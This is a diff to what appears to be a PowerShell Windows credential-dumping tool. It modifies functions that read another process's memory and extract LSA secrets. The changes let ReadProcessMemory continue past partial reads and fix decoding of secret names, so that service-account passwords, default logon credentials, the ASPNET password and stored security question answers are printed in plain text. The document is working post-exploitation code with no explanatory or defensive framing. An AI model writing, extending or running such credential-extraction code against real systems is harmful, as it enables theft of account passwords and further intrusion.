@@ -1404,6 +1404,7 @@ function LoadWinProcAPI
 
 			public const uint STATUS_SUCCESS = 0x0;
 			public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
+			public const uint ERROR_PARTIAL_COPY = 0x12B;
 
 			[DllImport("kernel32.dll")]
 			public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
@@ -1483,30 +1484,37 @@ function ReadMemory($Handle, $Pages, $Addr)
 				$Buff = New-Object byte[] $BuffLen
 				$BytesRead = $Null
 				$Res = [WinProcAPI]::ReadProcessMemory($Handle, $Page["BaseAddress"], $Buff, $Page["RegionSize"], [ref]$BytesRead)
-				If (-not $Res)
+				If (($BytesRead -ne $Page["RegionSize"]) -or ($Res -eq [WinProcAPI]::ERROR_PARTIAL_COPY))
 				{
-					Write-Host ("[-] Failed to read page with error {0}`n" -f ([WinProcAPI]::GetLastError()))
-					Exit
-				}
-				ElseIf ($BytesRead -ne $Page["RegionSize"])
-				{
-					Write-Host ("[-] Failed to read entire page region size with error {0}`n" -f ([WinProcAPI]::GetLastError()))
-					Exit
+					# Some memory in the page is not accessible
+					If (($Addr - $Page["BaseAddress"]) -lt ($BytesRead))
+					{
+						# We had read enough bytes into the page to reach $Addr -> Continue
+					}
+					Else
+					{
+						# We did not read bytes at $Addr -> Exit
+						Write-Host ("[-] ReadProcessMemory() failed with error {0}. Not enough bytes readed into the page to reach requested address. Exit`n" -f ([WinProcAPI]::GetLastError()))
+						Exit
+					}
 				}
 				Else
 				{
-					# Save memory page and return
-					$Global:CachedMemory["Buff"] = $Buff
-					$Global:CachedMemory["BaseAddr"] = $Page["BaseAddress"]
-					$Global:CachedMemory["EndAddr"] = $Page["EndAddress"]
-
-					return ($Buff, ($Addr - $Page["BaseAddress"]), $Page["BaseAddress"])
+					Write-Host ("[-] ReadProcessMemory() failed with unhandled error {0}. Exit`n" -f ([WinProcAPI]::GetLastError()))
+					Exit
 				}
+
+				# Save memory page and return
+				$Global:CachedMemory["Buff"] = $Buff
+				$Global:CachedMemory["BaseAddr"] = $Page["BaseAddress"]
+				$Global:CachedMemory["EndAddr"] = $Page["EndAddress"]
+
+				return ($Buff, ($Addr - $Page["BaseAddress"]), $Page["BaseAddress"])
 			}
 		}
 	}
 
-	Write-Host ("[-] Address 0x{0:X8} not found in process pages" -f ($Addr))
+	Write-Host ("[-] Address 0x{0:X8} not found in process pages. Continue" -f ($Addr))
 	return $Null
 }
 
@@ -2954,8 +2962,11 @@ function Get-LSASecrets($LSASecretKey)
 
 		$LSASecrets[$Child.PSChildName] = $LSASecret
 
+		Write-Host ($Child.PSChildName)
+
 		If ((-not $LSASecret["CurrVal"]) -or ($LSASecret["CurrVal"][0..1] -eq @(0, 0)))
 		{
+			Write-Host ("[+] Skipped {0} because no secrets" -f ($Child.PSChildName))
 			Continue
 		}
 		ElseIf ($Child.PSChildName -eq 'NL$KM')
@@ -3003,11 +3014,10 @@ function Get-LSASecrets($LSASecretKey)
 			If (-not $DefaultDomain) { $DefaultDomain = "." }
 			Write-Host ("[+] Default login account credentials = {0}\{1}:{2}" -f ($DefaultDomain, $DefaultLogin, $DefaultPWD))
 		}
-		ElseIf ($Child.PSChildName[0..3] -eq "_SC_")
+		ElseIf ([Text.Encoding]::ASCII.GetString($Child.PSChildName[0..3]) -eq "_SC_")
 		{
-			# Not tested
 			$Secret = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
-			$ServiceName = $Child.PSChildName[4..$($Child.PSChildName.Length-1)]
+			$ServiceName = [Text.Encoding]::ASCII.GetString($Child.PSChildName[4..$($Child.PSChildName.Length-1)])
 			$Services = Get-WmiObject Win32_Service -Property Name, StartName
 			ForEach ($Service in $Services)
 			{
@@ -3025,18 +3035,19 @@ function Get-LSASecrets($LSASecretKey)
 			$ASPNET_WP_PASSWORD = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
 			Write-Host ("[+] ASPNET Password = {0}" -f ($ASPNET_WP_PASSWORD))
 		}
-		ElseIf ($Child.PSChildName[0..8] -eq 'L$_SQSA_S')
+		ElseIf ([Text.Encoding]::ASCII.GetString($Child.PSChildName[0..8]) -eq 'L$_SQSA_S')
 		{
 			# Not tested
 			$SID = $Child.PSChildName[9..$($Child.PSChildName.length-1)]
 			$JSON = (([Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])).Replace([char]0xa0, " ")) | ConvertFrom-Json
 			If ([int]$JSON.version -eq 1)
 			{
+				Write-Host ("[+] Found Security Questions/Answers")
 				ForEach ($Item in $JSON.questions)
 				{
 				   $Question = $Item.question
 				   $Answer = $Item.answer
-				   Write-Host ("[+] Security Question/Answer = {0}:{1}" -f ($Question, $Answer))
+				   Write-Host ("`t[+] Security Question/Answer = '{0}':'{1}'" -f ($Question, $Answer))
 				}
 			}
 			Else
@@ -11434,10 +11445,6 @@ function Get-WindowsSecrets()
 		[Parameter(Mandatory=$False)][String]$ImpersonateMethod,
 		[Parameter(Mandatory=$False)][String]$Command
 		)
-
-	# TODO
-	# Test LSA Secrets for services
-	# Implement DPAPI decryption with Domain Backup Master Key
 
 	Write-Host ""
 
